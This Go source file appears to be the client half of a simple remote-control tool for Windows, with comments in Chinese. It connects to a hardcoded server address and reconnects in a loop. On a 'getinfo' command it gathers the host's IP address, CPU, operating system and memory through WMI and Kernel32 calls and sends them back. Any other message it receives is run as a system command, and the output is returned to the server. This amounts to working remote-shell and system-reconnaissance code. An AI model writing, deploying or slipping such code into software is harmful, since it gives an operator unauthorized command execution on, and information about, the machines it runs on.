package main

import (
    "fmt"
    "os"
    "net"
    "strconv"
    "time"
    "github.com/MXi4oyu/MoonSocket/protocol"
    "errors"
    "os/exec"
    "golang.org/x/text/transform"
    "bytes"
    "golang.org/x/text/encoding/simplifiedchinese"
    "io/ioutil"
    "strings"
    "syscall"
    "github.com/StackExchange/wmi"
    "unsafe"
    "k8s.io/apimachinery/pkg/util/json"
)

var (
    arglist []string
    pcinfo = make(map[string]string)
)

type cpuInfo struct {
    Name          string
    NumberOfCores uint32
    ThreadCount   uint32
}

type operatingSystem struct {
    Name    string
    Version string
}

type memoryStatusEx struct {
    cbSize                  uint32
    dwMemoryLoad            uint32
    ullTotalPhys            uint64 // in bytes
    ullAvailPhys            uint64
    ullTotalPageFile        uint64
    ullAvailPageFile        uint64
    ullTotalVirtual         uint64
    ullAvailVirtual         uint64
    ullAvailExtendedVirtual uint64
}

type Storage struct {
    Name       string
    FileSystem string
    Total      uint64
    Free       uint64
}

type storageInfo struct {
    Name       string
    Size       uint64
    FreeSpace  uint64
    FileSystem string
}

//定义CheckError方法，避免写太多到 if err!=nil
func CheckError(err error)  {
    if err!=nil{
        fmt.Fprintf(os.Stderr,"发生错误:%s",err.Error())
        os.Exit(1)
    }

}

//解决断线重连问题
func doWork(conn net.Conn) error {
    ch:=make(chan int,100)
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    for{
        select {
        case stat:=<-ch:
            if stat==2{
                return errors.New("None Msg")
            }
        case <-ticker.C:
            ch<-1
            go ClientMsgHandler(conn,ch)
        case <-time.After(time.Second*10):
            defer conn.Close()
            fmt.Println("超时断线....")
        }
    }
    return nil
}

func main()  {
    //动态传入服务端IP和端口号
    service:="127.0.0.1:8848"
    tcpAddr,err:=net.ResolveTCPAddr("tcp4",service)
    CheckError(err)
    for{
        conn,err:=net.DialTCP("tcp",nil,tcpAddr)
        if err!=nil{
            fmt.Fprintf(os.Stderr,"未连接服务端:%s \n",err.Error())
        }else{
            fmt.Printf("连接服务端:%s \n",conn.RemoteAddr().String())
            defer conn.Close()
            doWork(conn)
        }
        time.Sleep(3 * time.Second)
    }

}

//客户端消息处理
func ClientMsgHandler(conn net.Conn,ch chan int)  {
    <-ch
    //获取当前时间
    msg:="❤❤❤❤❤❤"
    go SendMsg(conn,msg)
    go ReadMsg(conn,ch)

}

// 获取时间
func GetSession() string{
    gs1:=time.Now().Unix()
    gs2:=strconv.FormatInt(gs1,10)
    return gs2
}

//接收服务端发来的消息
func ReadMsg(conn net.Conn,ch chan int)  {
    //存储被截断的数据
    tmpbuf:=make([] byte,0)
    buf:=make([] byte,1024)

    //将信息解包
    n,_:=conn.Read(buf)
    tmpbuf = protocol.Depack(append(tmpbuf,buf[:n]...))
    msg:=string(tmpbuf)
    fmt.Println("收到服务端发生的数据:",msg)
    if len(msg)==0{
        //服务端无返回信息
        ch<-2
    }else if msg == "getinfo"{
        pcinfo = getinfp()
        value,_ := json.Marshal(pcinfo)
        smsg:=protocol.Enpack([]byte(value))
        conn.Write(smsg)
    }else if msg != "cmd" {
        context := strings.Fields(msg)
        doCmd(conn,context)
    }
}

func getinfp() map[string]string{
    ip, err := externalIP()
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println(ip.String())
    cpu := getCPUInfo()
    osinfo := getOSInfo()
    men := getMemoryInfo()
    pcinfo["ip"] = ip.String()
    pcinfo["cpu"] = cpu
    pcinfo["osinfo"] = osinfo
    pcinfo["men"] = men
    return pcinfo
}

var kernel = syscall.NewLazyDLL("Kernel32.dll")

//获取IP
func externalIP() (net.IP, error) {
    ifaces, err := net.Interfaces()
    if err != nil {
        return nil, err
    }
    for _, iface := range ifaces {
        if iface.Flags&net.FlagUp == 0 {
            continue // interface down
        }
        if iface.Flags&net.FlagLoopback != 0 {
            continue // loopback interface
        }
        addrs, err := iface.Addrs()
        if err != nil {
            return nil, err
        }
        for _, addr := range addrs {
            ip := getIpFromAddr(addr)
            if ip == nil {
                continue
            }
            return ip, nil
        }
    }
    return nil, errors.New("connected to the network?")
}

func getIpFromAddr(addr net.Addr) net.IP {
    var ip net.IP
    switch v := addr.(type) {
    case *net.IPNet:
        ip = v.IP
    case *net.IPAddr:
        ip = v.IP
    }
    if ip == nil || ip.IsLoopback() {
        return nil
    }
    ip = ip.To4()
    if ip == nil {
        return nil // not an ipv4 address
    }

    return ip
}

//获取CPU信息
func getCPUInfo() string{

    var cpuinfo []cpuInfo

    err := wmi.Query("Select * from Win32_Processor", &cpuinfo)
    if err != nil {
        return "cpu获取失败"
    }
    return cpuinfo[0].Name
}

//获取操作系统版本
func getOSInfo() string{
    var operatingsystem []operatingSystem
    err := wmi.Query("Select * from Win32_OperatingSystem", &operatingsystem)
    if err != nil {
        return "操作系统获取失败"
    }
    return operatingsystem[0].Name
}

//获取内存
func getMemoryInfo() string{

    GlobalMemoryStatusEx := kernel.NewProc("GlobalMemoryStatusEx")
    var memInfo memoryStatusEx
    memInfo.cbSize = uint32(unsafe.Sizeof(memInfo))
    mem, _, _ := GlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
    if mem == 0 {
        return "获取内存"
    }
    return fmt.Sprintf("%.2fGB", float64(memInfo.ullTotalPhys)/float64(1024*1024*1024))
    //return fmt.Sprintf("%.2fGB", float64(memInfo.ullAvailPhys)/float64(1024*1024*1024))
}

func getStorageInfo() {
    var storageinfo []storageInfo
    var localStorages []Storage
    err := wmi.Query("Select * from Win32_LogicalDisk", &storageinfo)
    if err != nil {
        return
    }

    for _, storage := range storageinfo {
        info := Storage{
            Name:       storage.Name,
            FileSystem: storage.FileSystem,
            Total:      storage.Size,
            Free:       storage.FreeSpace,
        }
        localStorages = append(localStorages, info)
    }
    fmt.Printf("%.2fGB", float64(localStorages[0].Total)/float64(1024*1024*1024))
}

func doCmd(conn net.Conn,cmd []string){
    if cmd[0] != "" {
       switch cmd[0] {
       case "gettime":
           respondMsg := GetSession()
           SendMsg(conn,respondMsg)
       default:
           result,err := command(cmd)
           fmt.Println(result)
           if err != nil{
               SendMsg(conn,"运行出错！")
           }else {
               SendMsg(conn,result)
           }
       }
    }
}

func command(cmd []string) (string,error){
    for _,v := range cmd[1:] {
        arglist=append(arglist,v)
    }
    fmt.Println("======",arglist)
    result, err := exec.Command(cmd[0],arglist...).Output()
    if err != nil {
        fmt.Println("命令出错:", err.Error())
    }
    arglist = arglist[0:0]
    utf8,_:=GbkToUtf8(result)
    return string(utf8),err

}

//UTF-8 与 GBK 编码转换,防止中文乱码
func GbkToUtf8(s []byte) ([]byte, error) {
    reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
    d, e := ioutil.ReadAll(reader)
    if e != nil {
        return nil, e
    }
    return d, nil
}

//向服务端发送消息
func SendMsg(conn net.Conn,msg string)  {
    //将信息封包
    smsg:=protocol.Enpack([]byte(msg))
    conn.Write(smsg)

}